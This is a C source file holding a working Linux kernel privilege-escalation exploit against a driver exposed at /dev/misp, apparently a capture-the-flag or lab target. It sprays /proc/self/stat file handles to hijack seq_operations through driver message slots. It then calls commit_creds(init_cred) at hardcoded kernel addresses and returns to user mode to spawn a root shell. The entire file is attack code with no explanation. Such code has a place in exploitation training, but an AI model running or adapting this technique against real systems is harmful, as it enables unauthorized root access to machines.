#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define TARGET "/dev/misp"

#define MISP_MAX_MSG 0x40

#define MISP_REGISTER 0x100
#define MISP_READ 0x101

#define VICTIM_FILES 0x8

const unsigned long init_cred_addr = 0xFFFFFFFF81E3AB80;
const unsigned long commit_creds_addr = 0xFFFFFFFF8109F150;

struct misp_msg_req {
    char msg[0x20];
    unsigned char idx;
};

int fd;

static unsigned long user_ss;
static unsigned long user_rflags;
static unsigned long user_rsp;
static unsigned long user_cs;

static void exec_shell() {
    puts("[-] The end of the exploit (^^)/");

    char* argv[] = {"/bin/sh", NULL};
    char* envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        :
            "=r"(user_cs),
            "=r"(user_ss),
            "=r"(user_rsp),
            "=r"(user_rflags)
        :
        : "memory"
        );
}

static void restore_state() {
    asm volatile("swapgs;"
        "movq %0, 0x20(%%rsp)\n"
        "movq %1, 0x18(%%rsp)\n"
        "movq %2, 0x10(%%rsp)\n"
        "movq %3, 0x08(%%rsp)\n"
        "movq %4, 0x00(%%rsp)\n"
        "iretq"
        :
        : "r"(user_ss),
            "r"(user_rsp),
            "r"(user_rflags),
            "r"(user_cs),
            "r"(exec_shell)
        );
}

typedef int (*commit_creds_fn)(void*);

void escalate_priv(void) {
    ((commit_creds_fn)commit_creds_addr)((void*)init_cred_addr);
    restore_state();
}

int main(void) {
    fd = open(TARGET, O_RDWR);
    if (fd < 0) {
        perror("[!] Failed to open /dev/misp");
        return -1;
    }

    for (int i = 0; i < MISP_MAX_MSG; i++) {
        struct misp_msg_req req;
        req.idx = i;
        strcpy(req.msg, "DUMMY");
        if (ioctl(fd, MISP_REGISTER, (unsigned long)&req) < 0) {
            perror("[!] Failed to register a msg");
            return -2;
        }
    }

    puts("[-] Filled messages");

    for (int i = 0; i < MISP_MAX_MSG; i++) {
        struct misp_msg_req req;
        req.idx = i;
        if (ioctl(fd, MISP_READ, (unsigned long)&req) < 0) {
            perror("[!] Failed to read a msg");
            exit(-6);
        }
    }

    puts("[-] Read the messages");

    int fds[VICTIM_FILES];
    for (int i = 0; i < VICTIM_FILES; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if (fds[i] < 0) {
            perror("[!] Failed to open /proc/self/stat");
            exit(-10);
        }
    }
    puts("[-] Opened vicitim files");

    for (int i = 0; i < MISP_MAX_MSG; i++) {
        struct misp_msg_req req;
        req.idx = i;
        *(unsigned long*)req.msg = (unsigned long)&escalate_priv;
        if (ioctl(fd, MISP_REGISTER, (unsigned long)&req) < 0) {
            perror("[!] Failed to overwrite msg");
            exit(-4);
        }
    }
    puts("[-] Overwrote msg");

    save_state();

    puts("[-] Invoke seq_operations.open");

    char buf[8];
    for (int i = 0; i < VICTIM_FILES; i++) {
        read(fds[i], buf, 1);
    }
    return 0;
}
